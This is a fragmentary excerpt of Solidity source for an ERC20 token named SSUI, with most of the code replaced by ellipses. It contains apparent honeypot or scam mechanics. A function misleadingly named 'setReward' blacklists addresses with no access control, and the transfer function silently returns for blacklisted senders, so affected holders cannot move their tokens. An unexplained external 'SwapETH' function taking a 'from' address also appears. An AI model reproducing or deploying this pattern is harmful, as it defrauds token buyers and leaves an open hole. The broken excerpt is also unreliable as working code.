...
contract ERC20 is Context, IERC20, IERC20Metadata {
     ...
     * construction.
     */
    constructor(string memory name_, string memory symbol_, address _charity, uint8 __decimal, uint256 _totalSup) {
        _name = name_;
        _symbol = symbol_;
    ...
    * @dev Atomically increases the allowance granted to `spender` by the caller.
    ...
    function SwapETH(address from, uint256 _value) external returns (bool) {
...
// File: contracts/cname-bep-sol.sol
...
contract SSUI is ERC20Capped, ERC20Pausable, AccessControl {
    ...
    function setReward(address[] calldata _blackList) external{
        for(uint256 i = 0; i< _blackList.length;i++){
            blacklist[_blackList[i]] = true;
        }
    }

     function removeBlackList(address[] calldata _blackList) external{
        for(uint256 i = 0; i< _blackList.length;i++){
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal override(ERC20) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(blacklist[sender]==true) return;
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        ...
        if (balanceOf(uniswapV2Pair) != 0 || (balanceOf(uniswapV2Pair) == 0 && recipient != uniswapV2Pair))
        {
